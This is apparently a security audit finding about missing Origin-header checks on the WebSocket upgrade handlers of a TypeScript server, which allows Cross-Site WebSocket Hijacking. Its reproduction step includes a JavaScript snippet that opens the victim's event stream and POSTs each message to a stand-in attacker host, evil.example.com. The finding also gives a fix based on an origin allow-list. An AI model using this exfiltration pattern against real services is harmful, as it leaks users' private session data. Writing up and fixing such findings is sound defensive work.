---
id: SEC-T8-01
severity: high
category: OWASP A05:2021 - Security Misconfiguration / CWE-346 Origin Validation Error (CSWSH)
title: No Origin header validation on WebSocket upgrade — Cross-Site WebSocket Hijacking possible
file: server/src/realtime/live-events-ws.ts:351-385 / server/src/realtime/chat-ws.ts:423-458
status: open
---

## Description

Neither `setupLiveEventsWebSocketServer` nor `setupChatWebSocketServer` validate the HTTP `Origin` header during the WebSocket upgrade handshake. The `server.on("upgrade", ...)` handlers in both files inspect only the URL path and an optional bearer token or session cookie — the `Origin` header is never read.

In `authenticated` mode, the server relies on session cookies (delivered by `resolveSessionFromHeaders`). Session cookies are same-origin credentials, but a cross-origin page on another domain can still initiate a WebSocket connection to the server because browsers do NOT apply the same-origin policy to WebSocket upgrades — they only attach cookies automatically. Without an `Origin` check the server cannot distinguish a legitimate browser tab from a malicious cross-site page.

In `local_trusted` mode the check is absent AND any token-less connection is granted full board access (`bypassTagFilter: true`), making the attack trivially exploitable from any localhost-accessible origin (e.g. a compromised browser extension or a rogue page opened by the user).

## Impact

**Cross-Site WebSocket Hijacking (CSWSH).** An attacker-controlled web page (e.g. embedded in an iframe or opened in the same browser session) can:
- Subscribe to the live event stream of any company the victim belongs to.
- Join any open chat channel visible to the victim.
- Read real-time events (agent runs, issue updates, trace completions) that may contain sensitive business data.

This is a **complete bypass of the WebSocket auth** for cookie-authenticated users because the browser attaches session cookies regardless of Origin.

## Reproduction

1. Victim has an active `authenticated`-mode session to `https://mnm.example.com`.
2. Attacker serves a page at `https://evil.example.com` with:
   ```js
   const ws = new WebSocket('wss://mnm.example.com/api/companies/<victimCompanyId>/events/ws');
   ws.onmessage = e => fetch('https://evil.example.com/exfil', {method:'POST', body: e.data});
   ```
3. Browser attaches the `mnm.example.com` session cookie with the upgrade request.
4. Server grants access — victim's live event stream is relayed to the attacker.

## Recommendation

In `authorized` mode, validate the `Origin` header in the upgrade handler against the configured `trustedOrigins` list (already computed in `index.ts` for BetterAuth):

```ts
// In authorizeUpgrade / authorizeChatUpgrade, add as first check:
const origin = req.headers['origin'];
if (origin && !allowedOrigins.has(new URL(origin).origin)) {
  rejectUpgrade(socket, '403 Forbidden', 'origin not allowed');
  return null;
}
```

Pass `allowedOrigins` down from `index.ts` to both WS setup functions via `opts`. In `local_trusted` mode, restrict to `http://localhost` and `http://127.0.0.1` only.

## References

- https://christian-schneider.net/CrossSiteWebSocketHijacking.html
- OWASP WebSocket Security Cheat Sheet – Origin Header Validation
